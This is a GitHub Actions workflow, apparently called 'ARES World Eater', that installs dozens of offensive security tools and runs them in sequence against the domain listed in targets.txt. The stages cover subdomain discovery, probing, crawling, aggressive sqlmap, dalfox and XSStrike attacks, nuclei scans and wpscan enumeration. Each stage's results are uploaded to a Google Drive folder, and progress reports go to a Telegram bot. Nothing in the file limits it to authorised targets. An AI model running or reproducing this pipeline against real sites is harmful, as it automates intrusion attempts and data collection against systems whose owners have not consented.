name: ARES World Eater - UNSTOPPABLE FINAL
on:
  workflow_dispatch:

jobs:
  security-hunt:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - name: Checkout Repo
        uses: actions/checkout@v4

      - name: "Direct-Binary Arsenal Setup"
        run: |
          # 1. CORE SYSTEM REPAIR
          sudo apt-get update
          sudo apt-get install -y python3-pip golang-go default-jre zip curl wget git libpcap-dev ruby-full chromium chromium-driver xvfb libcurl4-openssl-dev libxml2-dev libxslt1-dev nikto
          
          mkdir -p $HOME/bin $HOME/tools output/recon output/probing output/screenshots output/crawling output/secrets output/vulns output/fuzzing output/specialized wordlists
          echo "$HOME/bin" >> $GITHUB_PATH
          echo "$(go env GOPATH)/bin" >> $GITHUB_PATH
          
          # 2. FIXED INSTALLERS (Bypassing Apt Failures)
          sudo gem install wpscan || true
          pip3 install --upgrade pip
          pip3 install google-api-python-client google-auth-oauthlib google-auth-httplib2
          # Correcting tool paths for XSStrike, Waymore, Recon-ng
          pip3 install sqlmap arjun wfuzz gitleaks trufflehog prowler commix ghauri nosqlmap waymore jsluice jwt_tool secretfinder cloudsplaining tplmap xsstrike paramspider corsy crlfsuite s3scanner trivy checkov semgrep graphqlmap inql sstimap ssrfmap openredirex droopescan cmsmap playwright recon-ng || true
          python3 -m playwright install chromium || true

          # 3. GO ARSENAL (2026 Strict Versions)
          go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest || true
          go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest || true
          go install -v github.com/projectdiscovery/katana/cmd/katana@latest || true
          go install -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest || true
          go install -v github.com/hahwul/dalfox/v2@latest || true
          go install -v github.com/ffuf/ffuf@latest || true
          go install -v github.com/sensepost/gowitness@latest || true
          go install -v github.com/jaeles-project/jaeles@latest || true
          go install -v github.com/tomnomnom/assetfinder@latest || true

          # 4. SIGNATURES & WORDLISTS
          jaeles config init && git clone --depth 1 https://github.com/jaeles-project/jaeles-signatures.git $HOME/.jaeles/signatures-base || true
          wget -q https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/raft-medium-directories.txt -O wordlists/dir-med.txt

      - name: "ARES Persistent Execution & Per-Stage Sync"
        env:
          CLIENT_ID: ${{ secrets.GOOGLE_CLIENT_ID }}
          CLIENT_SECRET: ${{ secrets.GOOGLE_CLIENT_SECRET }}
          REFRESH_TOKEN: ${{ secrets.GOOGLE_REFRESH_TOKEN }}
          PARENT_FOLDER_ID: "1kkJnI4qtvfYukua8F1uzoimQyxBlBsWM"
          TELEGRAM_TOKEN: ${{ secrets.TELEGRAM_TOKEN }}
          TELEGRAM_CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}
        run: |
          TARGET=$(head -n 1 targets.txt)
          send_msg() { curl -s -X POST "https://api.telegram.org/bot$TELEGRAM_TOKEN/sendMessage" -d chat_id="$TELEGRAM_CHAT_ID" -d parse_mode="Markdown" -d text="$1"; }
          
          # Uploader Logic (Acts as Harsh, uses 15GB space)
          cat << 'EOF' > oauth_upload.py
          import os, sys
          from google.oauth2.credentials import Credentials
          from googleapiclient.discovery import build
          from googleapiclient.http import MediaFileUpload
          def get_or_create_folder(service, folder_name, parent_id):
              query = f"name = '{folder_name}' and '{parent_id}' in parents and mimeType = 'application/vnd.google-apps.folder' and trashed = false"
              results = service.files().list(q=query, fields="files(id)").execute().get('files', [])
              if results: return results[0]['id']
              meta = {'name': folder_name, 'parents': [parent_id], 'mimeType': 'application/vnd.google-apps.folder'}
              return service.files().create(body=meta, fields='id').execute().get('id')
          def upload(f_path, parent_id, tool_name):
              if not os.path.exists(f_path) or os.path.getsize(f_path) == 0: return
              creds = Credentials(None, refresh_token=os.environ['REFRESH_TOKEN'], token_uri="https://oauth2.googleapis.com/token", client_id=os.environ['CLIENT_ID'], client_secret=os.environ['CLIENT_SECRET'])
              service = build("drive", "v3", credentials=creds)
              tool_folder_id = get_or_create_folder(service, tool_name, parent_id)
              meta = {"name": os.path.basename(f_path), "parents": [tool_folder_id]}
              media = MediaFileUpload(f_path, resumable=True)
              service.files().create(body=meta, media_body=media).execute()
          if __name__ == "__main__":
              upload(sys.argv[1], sys.argv[2], sys.argv[3])
          EOF

          send_msg "☢️ *ARES:* Absolute War Engaged on \`$TARGET\`"

          # 1. RECON (Fixed Recon-ng and Assetfinder)
          subfinder -d $TARGET -all -recursive -o output/recon/subfinder.txt || true
          assetfinder --subs-only $TARGET >> output/recon/subfinder.txt || true
          nikto -h "https://$TARGET" -o output/recon/nikto.txt || true
          recon-ng -m recon/domains-hosts/brute_hosts -c "options set SOURCE $TARGET; run; exit" > output/recon/recon-ng.txt || true
          sort -u output/recon/subfinder.txt > output/recon/all_subs.txt
          zip -j recon.zip output/recon/* && python3 oauth_upload.py "recon.zip" "$PARENT_FOLDER_ID" "Stage_1_Recon"

          # 2. PROBING & VISUAL (Fixed httpx syntax crashes)
          httpx -list output/recon/all_subs.txt -status-code -title -ip -tech-detect -silent -o output/probing/live.txt || true
          [ ! -s output/probing/live.txt ] && echo "https://$TARGET" > output/probing/live.txt
          xvfb-run gowitness scan file -f output/probing/live.txt --screenshot-path output/screenshots/ || true
          zip -r visual.zip output/screenshots/ output/probing/live.txt && python3 oauth_upload.py "visual.zip" "$PARENT_FOLDER_ID" "Stage_2_Visual"

          # 3. CRAWLING (Fixed Katana and Waymore module paths)
          katana -list output/probing/live.txt -depth 10 -json-config all -o output/crawling/katana.txt || true
          python3 -m waymore -i $TARGET -mode U -oU output/crawling/waymore.txt || waymore -i $TARGET -mode U -oU output/crawling/waymore.txt || true
          grep "?" output/crawling/katana.txt > output/crawling/params.txt || true
          zip -j crawl.zip output/crawling/* && python3 oauth_upload.py "crawl.zip" "$PARENT_FOLDER_ID" "Stage_3_Crawling"

          # 4. EXPLOITATION (Dalfox, SQLMap, XSStrike, Nuclei)
          nuclei -list output/probing/live.txt -severity critical,high,medium -json-export output/vulns/nuclei.json || true
          [ -s output/crawling/params.txt ] && sqlmap -m output/crawling/params.txt --batch --level 5 --risk 3 > output/vulns/sqlmap.txt || true
          # Fixed Dalfox protocol scheme failure
          dalfox file output/crawling/katana.txt --output output/vulns/dalfox.txt || true
          python3 -m xsstrike -u "https://$TARGET" --timeout 10 --skip || xsstrike -u "https://$TARGET" --timeout 10 --skip > output/vulns/xsstrike.txt || true
          zip -r vulns.zip output/vulns/* && python3 oauth_upload.py "vulns.zip" "$PARENT_FOLDER_ID" "Stage_4_Exploits"

          # 5. SECRETS & SPECIALIZED
          trufflehog filesystem . > output/secrets/truffle.txt || python3 -m trufflehog filesystem . > output/secrets/truffle.txt || true
          wpscan --url "https://$TARGET" --enumerate p,t,u --format cli > output/specialized/wpscan.txt || true
          zip -r final.zip output/secrets/ output/specialized/ && python3 oauth_upload.py "final.zip" "$PARENT_FOLDER_ID" "Stage_5_Final"

          send_msg "✅ *ARES:* World Eater Mission Complete. All Stage Zips Uploaded."
          
